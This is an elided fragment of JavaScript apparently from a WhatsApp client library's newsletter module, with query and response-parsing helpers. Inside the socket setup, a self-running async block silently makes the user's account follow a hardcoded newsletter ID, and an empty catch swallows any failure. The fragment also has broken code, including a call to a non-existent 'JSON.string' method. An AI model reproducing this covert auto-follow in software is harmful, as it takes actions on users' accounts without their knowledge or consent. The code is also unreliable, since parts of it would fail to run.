		...
		content: [
			{
				...
				content: Buffer.from(JSON.string({ variables }), 'utf-8')
			}
		]
	})
}
...
const parseNewsletterCreateResponse = (responseList) => {
  return responseList.map((res) => {
    ...
    return {
      ...
      subscribers: parseInt(thread?.subscriber_count || "0", 10),
...
(async () => {
  try {
  await newsletterwmexquery("120363404981805393@newsletter", Types_1.Query.FOLLOW);
  } catch {}
})()    
    
    return {
        ...sock,
        newsletterFetchAlParticipating: async () => {
        	const data = {}
